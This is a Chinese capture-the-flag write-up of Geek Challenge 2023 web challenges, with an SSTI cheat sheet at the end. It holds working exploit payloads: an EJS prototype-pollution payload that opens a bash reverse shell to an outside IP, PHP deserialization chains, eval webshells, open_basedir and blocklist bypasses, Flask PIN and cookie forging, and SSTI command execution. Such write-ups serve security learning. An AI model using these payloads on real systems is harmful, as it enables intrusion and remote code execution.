{deep:true}); } res.send(&quot;welcome to code&quot;);}); 上网搜索putil_merge函数，发现确实存在原型链污染 123456const putil_merge = require('putil-merge');const payload = JSON.parse('{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;polluted&quot;: &quot;yes&quot;}}}');let obj = {};console.log(&quot;Before:&quot; + {}.polluted)putil_merge(obj, payload, { deep: true });console.log(&quot;After:&quot; + {}.polluted) 改成 要改成application/json 1GET :/code 1POST:{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;userrole&quot;: &quot;Superadmin&quot;}}} 将Super[‘userrole’]的值改为Superadmin，就有权限执行： 1res.render('index', req.body); 这里是一个cve，可以参考这位大佬 影响版本：ejs &lt;= v3.1.9 （最新版本 123456789{&quot;name&quot;:&quot;abc&quot;, &quot;settings&quot;:{ &quot;view options&quot;:{ &quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require('child_process').execSync(\\&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5050 0&gt;&amp;1'\\&quot;);&quot;, &quot;client&quot;:&quot;true&quot; } }} ez_remove1234567891011121314151617181920212223&lt;?phphighlight_file(__FILE__);class syc{ public $lover; public function __destruct() { echo $this-&gt;lover; echo &quot;daozhel&quot;; eval($this-&gt;lover); }}if(isset($_GET['web'])){ if(!preg_match('/lover/i',$_GET['web'])){ $a=unserialize($_GET['web']); throw new Error(&quot;快来玩快来玩~&quot;); } else{ echo(&quot;nonono&quot;); }}?&gt; 利用十六进制要绕过正则匹配 1lover ==&gt; \\6cover 利用gc回收绕过异常 1O:3:&quot;syc&quot;:1 ==&gt; O:3:&quot;syc&quot;:2 写入一句话木马，这里需要注意的是要将小写s转变大写S ,才能解析十六进制 1?web=O:3:&quot;syc&quot;:2:{S:5:&quot;\\6cover&quot;;s:53:&quot;file_put_contents('2.php','&lt;?php @eval($_POST[1]);');&quot;;} 写入木马 ，发现无法正常执行shell命令，读取phpinfo查看disable_functions 发现禁用了函数system,exec,shell_exec,fopen,pcmtl_exe,passthru,popen 还有open_basedir: /var/www/html/ 绕过open_basedir: ini_set用来设置php.ini的值，无需打开php.ini文件，就能修改配置 1mkdir('test');chdir('test');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');show_source(&quot;f1ger&quot;); ez_path(os.path.join)pyc在线反汇编 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778# uncompyle6 version 3.8.0# Python bytecode 3.6 (3379)# Decompiled from: Python 3.7.0 (default, Nov 25 2022, 11:07:23) # [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]# Embedded file name: ./tempdata/96e9aea5-79fb-4a2f-a6b9-d4f3bbf3c906.py# Compiled at: 2023-08-26 01:33:29# Size of source mod 2**32: 2076 bytesimport os, uuidfrom flask import Flask, render_template, request, redirectapp = Flask(__name__)ARTICLES_FOLDER = 'articles/'articles = []class Article: def __init__(self, article_id, title, content): self.article_id = article_id self.title = title self.content = contentdef generate_article_id(): return str(uuid.uuid4())@app.route('/')def index(): return render_template('index.html', articles=articles)@app.route('/upload', methods=['GET', 'POST'])def upload(): if request.method == 'POST': title = request.form['title'] content = request.form['content'] article_id = generate_article_id() article = Article(article_id, title, content) articles.append(article) save_article(article_id, title, content) return redirect('/') else: return render_template('upload.html')@app.route('/article/&lt;article_id&gt;')def article(article_id): for article in articles: if article.article_id == article_id: title = article.title sanitized_title = sanitize_filename(title) article_path = os.path.join(ARTICLES_FOLDER, sanitized_title) with open(article_path, 'r') as (file): content = file.read() return render_template('articles.html', title=sanitized_title, content=content, article_path=article_path) return render_template('error.html')def save_article(article_id, title, content): sanitized_title = sanitize_filename(title) article_path = ARTICLES_FOLDER + '/' + sanitized_title with open(article_path, 'w') as (file): file.write(content)def sanitize_filename(filename): sensitive_chars = [ ':', '*', '?', '&quot;', '&lt;', '&gt;', '|', '.'] for char in sensitive_chars: filename = filename.replace(char, '_') return filenameif __name__ == '__main__': app.run(debug=True)# okay decompiling /tmp/65448aefd10b0.pyc 代码比较简单，就一个写和看的功能 漏洞点在：os.path.join函数没有对路径做很好的处理，将最后一个反斜杠看作路径的开头，所以可以任意文件泄露 然后发现debug=True，那思路就很明显了，通过os.path.join函数泄露文件计算pin码 123456789101112131415161718192021222324252627282930313233343536373839404142434445# sha1import hashlibfrom itertools import chainprobably_public_bits = [ 'root' # /etc/passwd 'flask.app', # 默认值 'Flask', # 默认值 '/usr/local/lib/python3.9/site-packages/flask/app.py' # 报错得到]private_bits = [ '37782193255385', # /sys/class/net/eth0/address 16进制转10进制 '31e70710-1d09-4cda-bc57-a7a012a89ef7docker-8037c9ea09717214042823e30fbac73b8ffa9c2671fad321c717e11489690a6b.scope' # /proc/self/cgroup]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv = Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) you konw flask?robots.txt泄露了3ysd8.html 访问3ysd8.html得到： 1&lt;!-- key是 app.secret_key = 'wanbao'+base64.b64encode(str(random.randint(1, 100)).encode('utf-8')).decode('utf-8')+'wanbao' (www,我可爱的菀宝,我存的够安全的吧) --&gt; 1234567import base64with open(&quot;dict.txt&quot;, &quot;w&quot;) as fp: for i in range(1, 100): original_string =str(i) byte_data = original_string.encode('utf-8') encoded_data = base64.b64encode(byte_data).decode('utf-8') fp.write('&quot;wanbao'+encoded_data + 'wanbao&quot;\\n') 12345PS D:\\Project&gt; flask-unsign --unsign --cookie &quot;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ0ZXN0IiwidXNlcl9pZCI6Mn0.ZUoT_Q.rZAY3c8K33S38x_AydOHdOh4ozQ&quot; --wordlist ./test/ctf_web/dict.txt[*] Session decodes to: {'is_admin': False, 'name': 'test', 'user_id': 2}[*] Starting brute-forcer with 8 threads..[+] Found secret key after 99 attempts'wanbaoMzU=wanbao' 12python3 flask_session_cookie_manager3.py encode -s &quot;wanbaoMzU=wanbao&quot; -t &quot;{'is_admin': True, 'name': 'admin', 'user_id': 1}&quot; #eyJpc19hZG1pbiI6dHJ1ZSwibmFtZSI6ImFkbWluIiwidXNlcl9pZCI6MX0.ZUoU3g.xvaYWmDWnhze2kXQpN0BTWOBuqY Pupyy_rce(无参RCE)1print_r(scandir(current(localeconv()))); flag.php文件在中间，不能像平常一样 通过unlink使得flag.php是倒数第二个文件在读取就ok了 1234unlink(end(scandir(current(localeconv()))));unlink(end(scandir(current(localeconv()))));unlink(next(array_reverse(scandir(current(localeconv())))));show_source(next(array_reverse(scandir(current(localeconv()))))); 补充： 有几率可以查看根目录，strrev(crypt(serialize(array())))所获得的字符串第一位有几率是/ 1print_r(scandir(chr(ord(strrev(crypt(serialize(array()))))))); 参考 ez_php源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;); error_reporting(0);show_source(__FILE__);include('key.php');include('waf.php');class Me { public $qwe; public $bro; public $secret; public function __wakeup() { echo(&quot;进来啦&lt;br&gt;&quot;); $characters = 'abcdefghijklmnopqrstuvwxyz0123456789'; $randomString = substr(str_shuffle($characters), 0, 6); $this-&gt;secret=$randomString; if($this-&gt;bro===$this-&gt;secret){ $bb = $this-&gt;qwe; return $bb(); } else{ echo(&quot;错了哥们,再试试吧&lt;br&gt;&quot;); } }}class her{ private $hername; private $key; public $asd; public function __invoke() { echo(&quot;好累，好想睡一觉啊&lt;br&gt;&quot;); serialize($this-&gt;asd); } public function find() { echo(&quot;你能找到加密用的key和她的名字吗？qwq&lt;br&gt;&quot;); if (encode($this-&gt;hername,$this-&gt;key) === 'vxvx') { echo(&quot;解密成功！&lt;br&gt;&quot;); $file=$_GET['file']; if (isset($file) &amp;&amp; (file_get_contents($file,'r') === &quot;loveyou&quot;)) { echo(&quot;快点的，急急急！！！&lt;br&gt;&quot;); echo new $_POST['ctf']($_GET['fun']); } else{ echo(&quot;真的只差一步了！&lt;br&gt;&quot;); } } else{ echo(&quot;兄弟怎么搞的？&lt;br&gt;&quot;); } }}class important{ public $power; public function __sleep() { echo(&quot;睡饱了，接着找！&lt;br&gt;&quot;); return $this-&gt;power-&gt;seeyou; }}class useless { private $seeyou; public $QW; public $YXX; public function __construct($seeyou) { $this-&gt;seeyou = $seeyou; } public function __destruct() { $characters = '0123456789'; $random = substr(str_shuffle($characters), 0, 6); if (!preg_match('/key\\.php\\/*$/i', $_SERVER['REQUEST_URI'])){ if((strlen($this-&gt;QW))&lt;80 &amp;&amp; strlen($this-&gt;YXX)&lt;80){ $bool=!is_array($this-&gt;QW)&amp;&amp;!is_array($this-&gt;YXX)&amp;&amp;(md5($this-&gt;QW) === md5($this-&gt;YXX)) &amp;&amp; ($this-&gt;QW != $this-&gt;YXX) and $random==='newbee'; if($bool){ echo(&quot;快拿到我的小秘密了&lt;br&gt;&quot;); $a = isset($_GET['a'])? $_GET['a']: &quot;&quot; ; if(!preg_match('/HTTP/i', $a)){ echo (basename($_SERVER[$a])); echo ('&lt;br&gt;'); if(basename($_SERVER[$a])==='key.php'){ echo(&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;); $file = &quot;key.php&quot;; readfile($file); } } else{ echo(&quot;你别这样，她会生气的┭┮﹏┭┮&quot;); } } } else{ echo(&quot;就这点能耐？怎么帮我找到她(╥╯^╰╥)&lt;br&gt;&quot;); } } } public function __get($good) { echo &quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;; $zhui = $this-&gt;$good; $zhui[$good](); }}if (isset($_GET['user'])) { $user = $_GET['user']; if (!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $user)) { unserialize($user); } else { echo(&quot;不是吧，第一层都绕不过去？？？&lt;br&gt;&quot;); }}else { echo(&quot;快帮我找找她！&lt;br&gt;&quot;);}?&gt; 虽然代码看起来比较长，但是还是比较好分析的，pop链也很容易看出来。需要用到两次pop链，第一条用来得到key.php的内容，第二次才是得到flag 123unserialize -&gt; useless(__destruct) -&gt; useless(readfile)unserialize -&gt; Me(__wakeup) -&gt;her(__invoke) -&gt;important(__sleep) -&gt;useless(__get) -&gt;her(find) /^[Oa]:[\\d]+/i第一次遇到这种情况，单独拿出来讲一下： 挺早之前我就知道使用C代替O能绕过wakeup，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容，这次比赛学到了种新方法，就是把正常的反序列化进行一次打包，让最后生成的payload以C开头即可 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow{ public function __wakeup(){ die(&quot;not allowed!&quot;); } public function __destruct(){ system($this-&gt;ctfshow); }}$data = $_GET['1+1&gt;2'];if(!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $data)){ unserialize($data);}?&gt; 不能直接将字母O改成字母C,这里我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头 12345678910111213141516171819202122232425&lt;?phpclass ctfshow { public $ctfshow; public function __wakeup(){ die(&quot;not allowed!&quot;); } public function __destruct(){ echo &quot;OK&quot;; system($this-&gt;ctfshow); } }$a=new ctfshow;$a-&gt;ctfshow=&quot;whoami&quot;;$arr=array(&quot;evil&quot;=&gt;$a);$oa=new ArrayObject($arr);$res=serialize($oa);echo $res;//unserialize($res)?&gt;#C:11:&quot;ArrayObject&quot;:77:{x:i:0;a:1:{s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:{s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;}};m:a:0:{}} 7.3.4才可以输出以C开头的payload，换7.4或者8.0输出的就是O开头了，除了这个函数还有其他方法可以对payload进行包装 实现了unserialize接口的大概率是C打头，经过所有测试发现可以用的类为： ArrayObject::unserialize ArrayIterator::unserialize RecursiveArrayIterator::unserialize SplObjectStorage::unserialize 参考 pop_onestr_shuffle：随机地打乱字符串中的所有字符 用原生类绕过md5,and的优先级要低于=，basename用ascii编码大于127绕过，$_SERVER是一个数组，可以自己打印看看 12345678910111213141516&lt;?phpclass useless{ public $QW; public $YXX;} $cmd=&quot;1&quot;;$a = new Exception($cmd);$b = new Exception($cmd,1);$tr = new useless();$tr-&gt;QW=$a;$tr-&gt;YXX=$b;$arr=array(&quot;evil&quot;=&gt;$tr);$oa=new ArrayObject($arr);echo urlencode(serialize(($oa)));#https://x64n15yejrv1auhzo7nkm4zct.node.game.sycsec.com/havefun.php/key.php/%ff?user=C%3A11%3A%22ArrayObject%22%3A473%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A7%3A%22useless%22%3A2%3A%7Bs%3A2%3A%22QW%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A3%3A%22YXX%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&amp;a=PHP_SELF 最终得到一段加密的数据，太长了我就不贴了，将数据base64解密保存成图片,得到key和hername cyberchef pop_two12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpclass Me { public $qwe; public $bro; public $secret;}class her{ public $hername; public $key; public $asd;}class important{ public $power;}class useless { public $seeyou ; public $QW; public $YXX;}$a = new Me();$a-&gt;bro = &amp;$a-&gt;secret;$b = new her();$a-&gt;qwe = $b;$c = new important();$d = new useless('deadbeef');// $d-&gt;good=array(&quot;seeyou&quot;=&gt;&quot;phpinfo&quot;) ;$cc = new her();$cc-&gt;key=9;$cc-&gt;hername=&quot;momo&quot;;$method = [$cc, 'find'];$d-&gt;seeyou= array(&quot;seeyou&quot;=&gt;$method) ;$c-&gt;power = $d;$b -&gt;asd = $c;$arr=array(&quot;evil&quot;=&gt;$a);$oa=new ArrayObject($arr);echo (serialize(($oa)));?&gt; #C:11:&quot;ArrayObject&quot;:345:{x:i:0;a:1:{s:4:&quot;evil&quot;;O:2:&quot;Me&quot;:3:{s:3:&quot;qwe&quot;;O:3:&quot;her&quot;:3:{s:7:&quot;hername&quot;;N;s:3:&quot;key&quot;;N;s:3:&quot;asd&quot;;O:9:&quot;important&quot;:1:{s:5:&quot;power&quot;;O:7:&quot;useless&quot;:4:{s:6:&quot;seeyou&quot;;a:1:{s:6:&quot;seeyou&quot;;a:2:{i:0;O:3:&quot;her&quot;:3:{s:7:&quot;hername&quot;;s:4:&quot;momo&quot;;s:3:&quot;key&quot;;i:9;s:3:&quot;asd&quot;;N;}i:1;s:4:&quot;find&quot;;}}s:2:&quot;QW&quot;;N;s:3:&quot;YXX&quot;;N;s:4:&quot;good&quot;;N;}}}s:3:&quot;bro&quot;;N;s:6:&quot;secret&quot;;R:20;}};m:a:0:{}} 这条pop链踩了坑，第一就是，对象里只写属性值，不要再写其他的不然会有影响； __sleep: 该函数必须返回一个需要进行序列化保存的成员属性数组 //并且只序列化该函数返回的这些成员属性 __get: 获得一个类中不可访问的成员变量时(未定义或私有属性) 在PHP中，你可以使用可调用的数组来将对象的方法赋值给变量。这可以通过将对象和方法名作为数组的元素来实现。以下是一个示例： 12345678910111213class MyClass { public function myMethod() { echo &quot;Hello, world!&quot;; }}$obj = new MyClass();$func = [$obj, 'myMethod'];// 现在 $func 变量包含了 MyClass 对象的 myMethod 方法// 调用该方法$func(); 这条链有意思，使得将her对象的find函数赋值给useless对象的seeyou变量，然后$this-&gt;good不用管，$this-&gt;good为空，会执行$good().$good是由important对象传过来的seeyou,而seeyou已经被赋值为了her对象的find函数，就会去执行find函数， 再用data协议绕过， 1file=data:text/plain;base64,bG92ZXlvdQ== 再用原生类绕过，这道题用了两次php原生类。 GlobIterator得到flag的文件名和路径.SplFileObject读文件，只能读取文件的第一行内容，配合php://filter拿到文件所有内容 1234567GET :fun=./f*POST: ctf=GlobIterator#flag_my_baby.phpGET:fun=php://filter/read=convert.base64-encode/resource=flag_my_baby.phpPOST :ctf=SplFileObject Akane!source code12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);show_source(__FILE__);class Hoshino{ public $Ruby; private $Aquamarine; public function __destruct() { $this-&gt;Ruby-&gt;func(); }}class Idol{ public $Akane; public function __wakeup() { $this-&gt;Akane = '/var/www/html/The************************.php'; } public function __call($method,$args) { $Kana = count(scandir($this-&gt;Akane)); if ($Kana &gt; 0) { die('Kurokawa Akane'); } else { die('Arima Kana'); } }}$a = unserialize(base64_decode($_GET['tuizi']));?&gt; 考的序列化，pop链也足够明显 :, 1Hoshino(__destruct) -&gt; Idol(__call) 但是没有找到任何可以命令执行的地方，然后我就去dirsearch ，也没有任何东西； 再仔细分析源码，pop链肯定是固定的这一点不用想，分析分析__call到底在干什么？ scandir列出 $this-&gt;Akane 目录中的文件和目录,返回的是一个数组 count 返回数组中元素的数目 glob:// — 查找匹配的文件路径模式 Example12345678&lt;?phperror_reporting(0);highlight_file(__FILE__);echo &quot;&lt;/br&gt;&quot;;echo count(scandir($_GET['file']));echo &quot;&lt;/br&gt;&quot;;var_dump(scandir($_GET['file']))?&gt; 12345http://127.0.0.1/test002.php?file=glob://f*#输出如下：2array(2) { [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(8) &quot;flag.php&quot; } exp12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsimport base64base_url =&quot;https://jn5lthd6e8wksjfi6mpuosppa.node.game.sycsec.com/?tuizi=&quot;str = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;def base64_encode(string): # 将字符串编码为 bytes 对象 string_bytes = string.encode('utf-8') # 使用 base64 模块进行编码 encoded_bytes = base64.b64encode(string_bytes) # 将编码后的 bytes 对象转换为字符串 encoded_string = encoded_bytes.decode('utf-8') return encoded_stringzifu = &quot;&quot;for i in range(100): k = i+30 data = f'O:7:&quot;Hoshino&quot;:2:{{s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:{{s:5:&quot;Akane&quot;;s:{k}:&quot;glob:///var/www/html/The*.php&quot;;}}s:19:&quot;HoshinoAquamarine&quot;;N;}}' zz = &quot;glob:///var/www/html/The&quot; +zifu +&quot;*.php&quot; if (len(zz) != k-1): break for j in range(len(str)): insert_string = zifu+str[j] print(zifu) start_index = data.find(&quot;The&quot;+zifu) insert_index = data.find(&quot;*.php&quot;) if insert_index != -1: # 在找到的位置之前插入字符串 modified_string = data[:insert_index] + insert_string + data[insert_index:] base_data = base64_encode(modified_string) url= base_url+base_data res = requests.get(url=url) if (len(res.text) ==4120): print(&quot;success&quot;) zifu=zifu +str[j] print(zifu) #print(url) break else: print(&quot;未找到插入位置&quot;)print(&quot;字符:&quot;+zifu)#字符:S4crEtF1AgFi1EByo2takuXX 访问TheS4crEtF1AgFi1EByo2takuXX.php得到flag klf_3source code再比赛中是看不到源码的，是我后来可以rce后，cat app.py得到源码的，为了方便写wp，就贴一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import reimport osapp = Flask(__name__)@app.route('/', methods=['GET', 'POST'])def index(): return render_template('index.html')@app.route('/secr3ttt', methods=['GET', 'POST'])def secr3t(): name = request.args.get('klf', '') template = f''' &lt;html&gt; &lt;body&gt; &lt;h1&gt;找到secr3t了，但是找不到flag你还是个klf&lt;/h1&gt; &lt;h1&gt;%s&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; &lt;img src=\\&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-blog/8.jpg\\&quot; alt=&quot;g&quot;&gt; &lt;!--klf?--&gt; &lt;!-- klf还想要flag？没那么容易 --&gt; ''' bl = ['_', '\\\\', '\\'', '&quot;', 'request', &quot;+&quot;, 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr', 'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/', 'flashed', 'os', 'open', 'read', 'count', '*', '43', '45', '38', '124', '47', '59', '99', '100', 'cat', '~', ':', 'not', '0', 'length', 'index', '-', 'ord', '37', '94', '96', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '[', ']', '@', '^', '#'] for i in bl: if i in name: return render_template('klf.html') #return &quot;真是klf！！！回去多学学啦&quot; pattern = r&quot;\\s*\\)\\s*\\)&quot; match = re.search(pattern, name) pattern2 = r&quot;\\s*\\)\\s*(,)?\\s*\\)&quot; match2 = re.search(pattern2, name) pattern3 = r&quot;\\s*\\)\\s*\\)\\s*\\|&quot; match3 = re.search(pattern3, name) pattern4 = r&quot;\\s*,\\s*\\)\\s*\\)\\s*\\|&quot; match4 = re.search(pattern4, name) pattern_mo = r&quot;\\d+\\s*%\\s*\\d+|[a-zA-Z]+\\s*%\\s*[a-zA-Z]+&quot; matche_mo = re.search(pattern_mo, name) if match: if match2.group(1): return render_template('klf.html') elif match4: return render_template('klf.html') elif match3: return render_template_string(template % name) else: return render_template('klf.html') # 输出匹配的结果 if matche_mo : return render_template('klf.html') a=render_template_string(template % name) if &quot;{&quot; in a: return a + render_template('win.html') return a@app.route('/robots.txt', methods=['GET'])def robots(): return send_from_directory(os.path.join(app.root_path, 'static'), 'robots.txt', mimetype='text/plain')if __name__ == '__main__': app.run(host='0.0.0.0', port=7888, debug=False) 还是可以用klf_2的解法解决,不可以用“))”，只需要从klf_2的exp改一下就好了，也是侥幸拿了一个一血 poc12345678910111213141516171819202122232425262728{% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%}{% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%}{% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%}{% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%}{% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%}{% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%}{% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%}{% set pp=dict(po=a,pen=b)|join %}{% set re=dict(re=a,ad=b)|join%}{% set kon=(()|select|string|list)|attr(po)(17)%} {% set dian=(g|string|list)|attr(po)(6)%} {% set qian=dict(p=a)|join%}{% set hou=dict(p=a,y=b)|join%}{% set ming=(kon,kon,dict(ap=a,p=b)|join,dian,hou)|join()%}{% set cmd=(dict(ca=a,t=b)|join,ming)|join()%}{% set a=()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% set bb=(a|string|list)|attr(po)(246)%}{% set ho=(dict(ap=a,p=b))|join%}{% set fl=(dict(fl4gfl4g=a,fl4g=b))|join%}{% set cmd=(dict(ca=a,t=b)|join,kon,bb,ho,bb,fl)|join%}{% set res =()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(117)|attr(ini)|attr(glo)|attr(geti)(pp)(cmd)|attr(re)()%}{% print(res) %} famale_imp_l0ve只能上传zip文件，而且存在一处文件包含，限制了后缀必须为.jpg;这题的php环境是5.6；\\x00的截断在php&gt;5.3.4就没用了 123456789&lt;?php//o2takuXX师傅说有问题，忘看了。header('Content-Type: text/html; charset=utf-8');highlight_file(__FILE__);$file = $_GET['file'];if(isset($file) &amp;&amp; strtolower(substr($file, -4)) == &quot;.jpg&quot;){ include($file);}?&gt; 在php中 zip://test.zip#1.png是什么意思? 在PHP中，zip://test.zip#1.png是一种URL封装协议，它允许你像访问本地文件一样访问ZIP存档中的文件。在这个例子中，zip://表示使用ZIP协议，test.zip是ZIP存档的文件名，#1.png表示存档中的文件路径。因此，zip://test.zip#1.png意味着你正在引用test.zip存档中的1.png文件。 新建一个文件 1.jpg图片内容即可为需要执行的命令，如&lt;?php eval($_POST[1]); ?&gt;打包成zip即include.php?file=zip://upload/3.zip%231.jpg change_itsource code1234 &lt;!--用户名为：user密码也为：user--&gt; 登陆之后没有权限上传文件，查看cookie是一段jwt加密，没什么好说的直接用工具跑出key 12key : &quot;yibao&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6ImFkbWluIiwiYWRtaW4iOiJ0cnVlIn0.qs6tjnaghMXiTsvqEMUauz_JGzxxKdtaXPGVtQUEHek 现在有权限上传任意文件了，但是只知道文件上传在upload下，不知道文件名，查看源代码 123456789101112function php_mt_seed($seed) { mt_srand($seed); } $seed = time(); php_mt_seed($seed); $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $newFileName = ''; for ($i = 0; $i &lt; 10; $i++) { $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; } 这代码很明显了，只要知道time的时间戳，既可以知道文件名， poc解释一下我的脚本:设置一个十秒的时间戳，在这十秒之内上传一个文件必定可以中一个文件的时间戳 123456789101112131415161718&lt;?php highlight_file(__FILE__);function php_mt_seed($seed){ mt_srand($seed);}for ($j = 0; $j &lt; 10; $j++){ $seed = time(); php_mt_seed($seed); sleep(1); echo $seed.&quot;: &quot;; $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $newFileName = ''; for ($i = 0; $i &lt; 10; $i++) { $newFileName .= $characters[mt_rand(0, strlen($characters) - 1)]; } echo $newFileName.&quot;&lt;/br&gt;&quot;;} 运行这个脚本，在十秒之内上传一个木马文件即可，然后脚本会根据十个时间戳输出十个文件名，其中必定会中一个文件名 flag保卫战(待复现)ezrfi(待复现)scan_tool(待复现)ez_sql(待复现)EZ_Smuggling(待复现)java(待复现)","link":"/2023/11/26/Geek%20Challenge%202023/"},{"title":"SSTI漏洞","text":"ssti常用命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__class__ 类的一个内置属性，表示实例对象的类。__base__ 类型对象的直接基类__bases__ 类型对象的全部基类（除object），以元组形式，类型的实例通常没有属性。 __bases____mro__ 此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__() 返回这个类的所有子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ 初始化类，返回的类型是function__globals__ 使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__ 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__() 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__() 调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')__builtins__ 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__ 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]__str__() 返回描写这个对象的字符串，可以理解成就是打印出来。url_for flask的一个方法，可以调用当前脚本中的函数，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。lipsum flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__.os.popen('ls').read()}}current_app 应用上下文，一个全局变量。request 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()request.args.x1 get传参request.values.x1 所有参数request.cookies cookies参数request.headers 请求头参数request.form.x1 post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data post传参 (Content-Type:a/b)request.json post传json (Content-Type: application/json)config 当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}self.__dict__ 保存当前类实例或对象实例的属性变量键值对字典，{%print(&quot;DMIND&quot;)%} 控制语句中也能输出拼接字符：{% set ind=dict(ind=a,ex=a)|join%} 变量ind=index获取字符：{{lipsum|string|list|attr('pop')(18)}} 相当于：lipsum|string|list|attr('pop')(18) 